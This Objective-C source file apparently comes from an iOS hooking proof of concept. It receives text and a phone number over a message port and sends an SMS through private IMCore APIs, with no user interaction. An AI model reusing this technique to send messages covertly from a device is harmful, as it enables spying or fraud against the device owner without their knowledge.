//
//  SMSSender000.m
//  HookPOC
//
//  Created by Makara Khloth on 3/8/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//

#import "SMSSender000.h"

#import "IMService+IOS6.h"
#import "IMServiceImpl+IOS6.h"
#import "IMAccount+IOS6.h"
#import "IMHandle+IOS6.h"
#import "IMMessage+IOS6.h"
#import "IMChat+IOS6.h"
#import "IMAccountController+IOS6.h"
#import "IMChatRegistry.h"

#import "NSConcreteMutableAttributedString.h"
#import "NSConcreteAttributedString.h"

static SMSSender000 *_SMSSender000 = nil;

@interface SMSSender000 (private)
- (void) sendMessage000: (NSString *) aText toAddress: (NSString *) aAddress;
@end

@implementation SMSSender000

+ (id) sharedSMSSender000 {
	if (_SMSSender000 == nil) {
		_SMSSender000 = [[SMSSender000 alloc] init];
	}
	return (_SMSSender000);
}

- (id) init {
	self = [super init];
	if (self) {
		mMessagePortReader = [[MessagePortIPCReader alloc] initWithPortName:@"SMSSENDERMSGPORT"
												 withMessagePortIPCDelegate:self];
		[mMessagePortReader start];
		
		// Trigger to ready
		Class $IMServiceImpl = objc_getClass("IMServiceImpl");
		[$IMServiceImpl serviceWithName:@"SMS"];
	}
	return (self);
}

- (void) dataDidReceivedFromMessagePort: (NSData*) aRawData {
	NSLog(@"Did received data from message port, aRawData = %@", aRawData);
	
	if (aRawData) {
		NSInteger lengthOfText = 0;
		NSInteger lengthOfAddress = 0;
		NSInteger location = 0;
		
		NSString *text = nil;
		NSString *address = nil;
		
		[aRawData getBytes:&lengthOfText length:sizeof(NSInteger)];
		location += sizeof(NSInteger);
		NSData *textData = [aRawData subdataWithRange:NSMakeRange(location, lengthOfText)];
		text = [[NSString alloc] initWithData:textData encoding:NSUTF8StringEncoding];
		location += lengthOfText;
		
		[aRawData getBytes:&lengthOfAddress range:NSMakeRange(location, sizeof(NSInteger))];
		location += sizeof(NSInteger);
		NSData *addressData = [aRawData subdataWithRange:NSMakeRange(location, lengthOfAddress)];
		address = [[NSString alloc] initWithData:addressData encoding:NSUTF8StringEncoding];
		
		[self sendMessage000:text toAddress:address];
		
		[text release];
		[address release];
	}
}

- (void) sendMessage000: (NSString *) aText toAddress: (NSString *) aAddress {
	// 1. Searching for sms account
	Class $IMServiceImpl = objc_getClass("IMServiceImpl");
	[$IMServiceImpl serviceWithName:@"SMS"];
	
	Class $IMAccountController = objc_getClass("IMAccountController");
	IMAccountController *accountController = [$IMAccountController sharedInstance];
	
	NSLog(@"$IMServiceImpl = %@", [$IMServiceImpl serviceWithName:@"SMS"]);
	NSLog(@"accountController = %@", accountController);
	
	NSLog(@"_accounts = %@", [accountController _accounts]);
	NSLog(@"accounts = %@", [accountController accounts]);
	NSLog(@"operationalAccounts = %@", [accountController operationalAccounts]);
	NSLog(@"connectedAccounts = %@", [accountController connectedAccounts]);
	NSLog(@"activeAccounts = %@", [accountController activeAccounts]);
	NSLog(@"numberOfAccounts = %d", [accountController numberOfAccounts]);
	
	IMAccount *smsAccount = nil;
	for (IMAccount *account in [accountController activeAccounts]) {
		if ([[account serviceName] isEqualToString:@"SMS"]) {
			smsAccount = account;
			break;
		}
	}
	
	NSLog(@"smsAccount = %@", smsAccount);
	
	// Create sms handle
	Class $IMHandle = objc_getClass("IMHandle");
	IMHandle *smsHandle = [[$IMHandle alloc] initWithAccount:smsAccount
														  ID:aAddress
											alreadyCanonical:YES];
	NSLog(@"smsHandle = %@", smsHandle);
	
	// Create chat
	Class $IMChatRegistry = objc_getClass("IMChatRegistry");
	IMChatRegistry *chatRegistry = [$IMChatRegistry sharedInstance];
	IMChat *chat = [chatRegistry chatForIMHandle:smsHandle];
	
	NSLog(@"chatRegistry = %@", chatRegistry);
	NSLog(@"chat = %@", chat);
	
	// Create sms message
	NSDictionary *attributes = [NSDictionary dictionaryWithObject:[NSNumber numberWithInt:0]
														   forKey:@"__kIMMessagePartAttributeName"];
	Class $NSConcreteMutableAttributedString = objc_getClass("NSConcreteMutableAttributedString");
	NSConcreteMutableAttributedString *messageText = [[$NSConcreteMutableAttributedString alloc] initWithString:aText
																									 attributes:attributes];
	NSLog(@"messageText = %@", messageText);
	
	Class $NSConcreteAttributedString = objc_getClass("NSConcreteAttributedString");
	NSConcreteAttributedString *messageSubject = [[$NSConcreteAttributedString alloc] initWithString:@""];
	NSLog(@"messageSubject = %@", messageSubject);
	
	Class $IMMessage = objc_getClass("IMMessage");
	IMMessage *smsMessage = [[$IMMessage alloc] initWithSender:smsHandle
														  time:[NSDate date]
														  text:messageText
												messageSubject:messageSubject
											 fileTransferGUIDs:[NSArray array]
														 flags:5
														 error:nil
														  guid:nil
													   subject:nil];
	NSLog(@"smsMessage = %@", smsMessage);
	
	// Send sms
	[chat sendMessage:smsMessage];
	
	[smsMessage release];
	[messageSubject release];
	[messageText release];
	[smsHandle release];
}

- (void) dealloc {
	_SMSSender000 = nil;
	[mMessagePortReader release];
	[super dealloc];
}

@end
